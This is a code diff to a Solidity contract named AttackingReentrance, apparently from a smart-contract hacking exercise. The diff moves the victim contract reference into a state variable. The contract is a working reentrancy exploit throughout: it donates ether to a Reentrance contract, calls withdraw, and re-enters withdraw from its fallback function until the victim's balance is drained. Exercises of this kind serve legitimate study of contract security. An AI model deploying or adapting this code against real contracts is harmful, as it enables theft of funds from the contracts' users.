@@ -4,19 +4,19 @@ import "./Reentrance.sol";
 
 contract AttackingReentrance {
     address payable public contractAddress;
+    Reentrance victimContract;
 
     constructor(address payable _contractAddress) payable {
         contractAddress = _contractAddress;
+        victimContract = Reentrance(contractAddress);
     }
 
     function hackContract() external {
-        Reentrance victimContract = Reentrance(contractAddress);
         victimContract.donate{value: address(this).balance}(address(this));
         victimContract.withdraw();
     }
 
     fallback() external payable {
-        Reentrance victimContract = Reentrance(contractAddress);
         if(contractAddress.balance > 0) {
         victimContract.withdraw();
         }
